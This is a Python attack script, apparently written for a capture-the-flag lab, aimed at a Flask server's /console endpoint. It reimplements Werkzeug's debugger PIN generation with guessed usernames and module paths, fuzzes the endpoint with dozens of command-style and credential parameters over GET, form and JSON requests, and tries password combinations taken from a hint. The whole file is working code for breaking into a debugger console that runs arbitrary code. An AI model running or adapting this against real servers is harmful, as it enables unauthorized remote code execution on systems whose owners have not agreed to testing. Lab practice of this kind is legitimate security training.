import requests
import re
import hashlib
import itertools

BASE = "http://10.114.139.59:5000"
FLAG_RE = re.compile(r"THM\{[^}]+\}")
s = requests.Session()

# Werkzeug debugger PIN calculation
# In Werkzeug >= 2.3, the PIN is calculated using:
# - username (who runs the server process)
# - modname (e.g., 'flask.app')  
# - getattr(app, '__name__', type(app).__name__)  -> 'Flask'
# - getattr(mod, '__file__', None)  -> path to flask/app.py
# - str(uuid.getnode())  -> MAC address as integer
# - get_machine_id()  -> /etc/machine-id + /proc/self/cgroup

# For a typical Ubuntu/Docker Flask setup:
# username: often 'root', 'flask', 'www-data', 'ubuntu', 'app'
# modname: 'flask.app'
# appname: 'Flask' (or 'wsgi_app' for older)
# mod_file: '/usr/local/lib/python3.10/dist-packages/flask/app.py' (pip install)
#           or '/usr/lib/python3/dist-packages/flask/app.py' (apt)
# node: MAC address integer
# machine_id: /etc/machine-id content + /proc/self/cgroup docker id

# Since we can't read files directly, let's try common combinations
# and generate PINs

# Werkzeug >= 2.3 uses SHA1-based PIN generation
def generate_pin_sha1(username, modname, appname, mod_file, node, machine_id):
    """Generate Werkzeug debugger PIN (SHA1 method, Werkzeug >= 2.3)"""
    h = hashlib.sha1()
    
    probably_public_bits = [
        username,       # e.g. 'root'
        modname,        # e.g. 'flask.app'
        appname,        # e.g. 'Flask'
        mod_file,       # e.g. '/usr/local/lib/python3.10/dist-packages/flask/app.py'
    ]
    
    private_bits = [
        str(node),       # MAC address as integer
        machine_id,      # machine-id + cgroup docker id
    ]
    
    for bit in itertools.chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")
    
    num = None
    h_pin = h.copy()
    h_pin.update(b"pinsalt")
    num = f"{int(h_pin.hexdigest(), 16) % 10**9:09d}"
    pin = f"{num[:3]}-{num[3:6]}-{num[6:]}"
    
    return pin

# Also try MD5 method (older Werkzeug)
def generate_pin_md5(username, modname, appname, mod_file, node, machine_id):
    """Generate Werkzeug debugger PIN (MD5 method, older Werkzeug)"""
    h = hashlib.md5()
    
    probably_public_bits = [username, modname, appname, mod_file]
    private_bits = [str(node), machine_id]
    
    for bit in itertools.chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")
    
    num = None
    h_pin = h.copy()
    h_pin.update(b"pinsalt")
    num = f"{int(h_pin.hexdigest(), 16) % 10**9:09d}"
    pin = f"{num[:3]}-{num[3:6]}-{num[6:]}"
    
    return pin

# Common combinations for Ubuntu with Python 3.10
usernames = ["root", "flask", "www-data", "ubuntu", "app", "cupid", "love"]
modnames = ["flask.app"]
appnames = ["Flask"]
mod_files = [
    "/usr/local/lib/python3.10/dist-packages/flask/app.py",
    "/usr/lib/python3/dist-packages/flask/app.py",
    "/usr/lib/python3.10/site-packages/flask/app.py",
    "/home/flask/.local/lib/python3.10/site-packages/flask/app.py",
    "/home/cupid/.local/lib/python3.10/site-packages/flask/app.py",
    "/app/.venv/lib/python3.10/site-packages/flask/app.py",
    "/opt/venv/lib/python3.10/site-packages/flask/app.py",
]

# We don't know MAC or machine-id but let's try a different approach
# Maybe we can get this info via the web app somehow

# Actually, let's think about this differently.
# What if the /console endpoint is NOT the Werkzeug debugger?
# What if it's a custom Flask route that returns 400 because
# it requires a specific request body format?

# The 400 "Bad Request" in Flask/Werkzeug happens when:
# 1. Required form data is missing (request.form['key'] raises 400)
# 2. Required JSON is malformed
# 3. Required args are missing (request.args['key'] raises 400)

# So /console might be a Flask view that does something like:
#   code = request.args['code']  -> 400 if 'code' not in args
# or:
#   data = request.get_json(force=True)  -> 400 if invalid JSON
# or:
#   cmd = request.form['cmd']  -> 400 if no form data

# The 400 means WERKZEUG couldn't parse the request,
# OR the app explicitly aborts with 400

# Let me test EVERY single common param name systematically
# to see which one(s) the /console route expects

print("=== Systematic param test for /console ===")
# Test individual params to find which one changes the 400
all_params = [
    "code", "cmd", "command", "exec", "eval", "run",
    "script", "input", "output", "expression", "expr",
    "query", "q", "sql", "statement", "line",
    "python", "py", "shell", "bash", "sh",
    "password", "pass", "passwd", "pwd", "pin", "secret",
    "key", "token", "auth", "api_key", "apikey",
    "username", "user", "login", "name",
    "action", "type", "mode", "op", "operation",
    "data", "body", "text", "content", "message", "msg",
    "file", "path", "url", "source", "src",
    "id", "uid", "session", "sid",
    "letter", "love", "cupid", "arrow", "valentine",
    "unlock", "open", "access", "enter",
]

# GET with each param
print("  GET params:")
for p in all_params:
    r = s.get(f"{BASE}/console", params={p: "test"}, timeout=3)
    if r.status_code != 400:
        print(f"    ?{p}=test -> {r.status_code} ({len(r.text)} bytes)")
        print(f"      {r.text[:200]}")
        for f in FLAG_RE.findall(r.text):
            print(f"      [FLAG] {f}")

# POST form data with each param
print("\n  POST form params:")
for p in all_params:
    r = s.post(f"{BASE}/console", data={p: "test"}, timeout=3)
    if r.status_code != 400 and r.status_code != 405:
        print(f"    {p}=test -> {r.status_code} ({len(r.text)} bytes)")
        print(f"      {r.text[:200]}")
        for f in FLAG_RE.findall(r.text):
            print(f"      [FLAG] {f}")

# POST JSON with each param
print("\n  POST JSON params:")
for p in all_params:
    r = s.post(f"{BASE}/console", json={p: "test"}, timeout=3)
    if r.status_code != 400 and r.status_code != 405:
        print(f"    {p}=test -> {r.status_code} ({len(r.text)} bytes)")
        print(f"      {r.text[:200]}")
        for f in FLAG_RE.findall(r.text):
            print(f"      [FLAG] {f}")

# Maybe /console requires MULTIPLE params together
# The hint says cupid_arrow_2026!!!
# Maybe: username=cupid&password=arrow_2026!!!
# Or: user=cupid&key=arrow_2026!!!
print("\n=== Multi-param combos ===")
combos = [
    {"username": "cupid", "password": "arrow_2026!!!"},
    {"user": "cupid", "pass": "arrow_2026!!!"},
    {"user": "cupid", "password": "cupid_arrow_2026!!!"},
    {"username": "cupid", "password": "cupid_arrow_2026!!!"},
    {"login": "cupid", "password": "cupid_arrow_2026!!!"},
    {"name": "cupid", "key": "arrow_2026!!!"},
    {"name": "cupid", "secret": "cupid_arrow_2026!!!"},
    {"pin": "cupid_arrow_2026!!!"},
    {"code": "cupid_arrow_2026!!!"},
    {"unlock": "cupid_arrow_2026!!!"},
    {"key": "cupid_arrow_2026!!!", "action": "unlock"},
    {"password": "cupid_arrow_2026!!!", "action": "login"},
]

for combo in combos:
    # GET
    r = s.get(f"{BASE}/console", params=combo, timeout=3)
    if r.status_code != 400:
        print(f"  GET {combo} -> {r.status_code} ({len(r.text)} bytes)")
        print(f"    {r.text[:300]}")
        for f in FLAG_RE.findall(r.text):
            print(f"    [FLAG] {f}")
    
    # POST form
    r = s.post(f"{BASE}/console", data=combo, timeout=3)
    if r.status_code != 400 and r.status_code != 405:
        print(f"  POST form {combo} -> {r.status_code} ({len(r.text)} bytes)")
        print(f"    {r.text[:300]}")
    
    # POST JSON
    r = s.post(f"{BASE}/console", json=combo, timeout=3)
    if r.status_code != 400 and r.status_code != 405:
        print(f"  POST JSON {combo} -> {r.status_code} ({len(r.text)} bytes)")
        print(f"    {r.text[:300]}")

print("\nDone.")
